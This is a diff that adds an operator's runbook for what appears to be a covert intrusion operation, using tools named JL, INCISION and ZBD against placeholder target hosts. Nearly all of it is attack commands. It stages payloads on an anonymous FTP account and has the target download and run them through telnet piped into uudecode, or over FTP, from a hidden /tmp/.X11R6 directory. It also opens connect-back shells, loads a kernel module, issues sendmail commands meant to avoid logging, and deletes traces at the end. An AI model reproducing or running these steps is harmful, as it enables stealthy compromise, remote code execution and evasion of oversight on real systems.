@@ -1,0 +1,158 @@
+##
+## Setup.
+##
+xrdb /mnt/zip/etc/Xdefaults
+cd /mnt/zip/targets
+export PATH=/mnt/zip/bin:$PATH
+export cn=
+	  ###COVER_NAME###
+
+#### Target Windows.
+export DISPLAY=:0.1
+xterm -name tw -title JL--${cn}  -e script -a ${cn}/script-JL.$(date +%Y%m%d) &
+xterm -name tw -title IN--${cn}  -e script -a ${cn}/script-IN.$(date +%Y%m%d) &
+xterm -name tw -title ZBD--${cn} -e script -a ${cn}/script-ZBD.$(date +%Y%m%d)&
+xterm -name tw -title CMD--${cn} -e script -a ${cn}/script-CMD.$(date +%Y%m%d)&
+export DISPLAY=:0
+xterm -name tcp -title TCPDUMP   -e script -a ${cn}/tcp.$(date +%Y%m%d) &
+
+#### Setup ftp access for tool grab.
+adduser -u 9999 -g 50 -d /mnt/zip/pub -s /bin/false -c "ftp user" anon
+passwd anon
+	mozilla@netscape.com
+
+rm -rf /mnt/zip/pub/.* /mnt/zip/pub/Desktop
+
+cp -f /mnt/zip/etc/shells  /etc/shells
+cp -f /mnt/zip/bin/zbd_s   /mnt/zip/pub/ncsd
+cp -f /mnt/zip/targets/${cn}/deploy/tar0.Z /mnt/zip/pub/tar0.Z
+compress /mnt/zip/pub/ncsd
+
+#### Get connected.
+xisp &
+tcpdump -ni ppp0
+----
+ifconfig eth0 203.151.44.3 netmask 255.255.255.0
+route add default gw 203.151.44.1 eth0
+tcpdump -ni eth0
+
+
+##
+## Setup for JL.	Use JL window.
+##
+conf.iptables
+jl
+jl.nc
+
+
+##
+## If you will be using INCISION, start this in the IN window.
+##
+keys=quivertree  ftshell tn -v -p 17325 localhost
+
+
+##
+## If you are going to use ZBD, then run this in the ZBD window.
+##
+ls -l /mnt/zip/tools/nscd.uu
+nc -l -p 32711 < /mnt/zip/tools/nscd.uu
+
+
+##
+## If you do not want JL to connect back to you, then do this...
+##
+> /mnt/zip/bin/.PORT
+echo /dev/null > /mnt/zip/bin/.TTY
+
+
+##
+## JL into target.	Use CMD window.
+##
+
+#### Choose one of the following commands to run at the "remote cmd:" prompt.
+--- For interact in a Bourne shell ---
+exec sh
+
+--- To run a an INCISION sysiddev already installed. ---
+exec /usr/sbin/sysiddev ###LOCALIP### ###PORT### -i -- /usr/lib/sendmail -bd -q1h
+
+--- To upload & start ZBD. ---
+PATH=:/usr/bin export PATH; echo "rm \$0; mkdir /tmp/.X11R6; cd /tmp/.X11R6; telnet ###LOCALIP### 32711 | uudecode; uncompress nscd.Z; chmod 700 nscd; nscd" > .spool; sh .spool
+
+#### Then, issue the following commands to sendmail to avoid logging.
+(smtp)  mail
+(smtp)  quit
+
+
+##
+## If you use the Bourne shell in the JL window to upload tools...
+##
+PATH=:/bin:/usr/bin:/sbin:/usr/sbin:/usr/ccs/bin:/usr/local/bin
+export PATH
+
+wdir=/tmp/.X11R6
+ls -l $wdir
+	# if it exists, then use something else.
+mkdir $wdir
+chmod 700 $wdir
+cd $wdir
+pwd
+stty sane
+
+ftp -n
+ftp> open ###LOCALIP###
+ftp> user anon mozilla@netscape.com
+ftp> bin
+ftp> get ncsd.Z
+ftp> bye
+
+uncompress ncsd.Z
+chmod +x ncsd
+ncsd
+
+
+##
+## If you use zbd in the ZBD window to upload tools...
+##
+zbd_c ###TARGETIP###
+PATH=:/bin:/usr/bin:/sbin:/usr/sbin:/usr/ccs/bin:/usr/local/bin
+export PATH
+
+upload /mnt/zip/pub/tar0.Z
+uncompress tar0.Z && tar xf tar0
+
+cp /usr/sbin/modload ml
+ml bio
+
+sy ###LOCALIP### 17325 -i &
+
+
+##
+## Once TN connects, begin op...
+##
+PATH=:/bin:/usr/bin:/sbin:/usr/sbin:/usr/ccs/bin:/usr/local/bin
+export PATH
+
+wdir=/tmp/.X11R6
+mkdir $wdir
+cd $wdir
+pwd
+w
+stty sane
+
+#### if :( then...
+# ~~p /mnt/zip/targets/quivertree/deploy/bio bio
+# modload bio; rm bio
+# sysiddev 212.62.190.2 17325 -i &
+
+
+##
+## Clean up.
+##
+cd /tmp; rm -rf $wdir
+ls -al $wdir
+exit
+^d
+
+userdel -r anon
+rm -rf /mnt/zip/pub
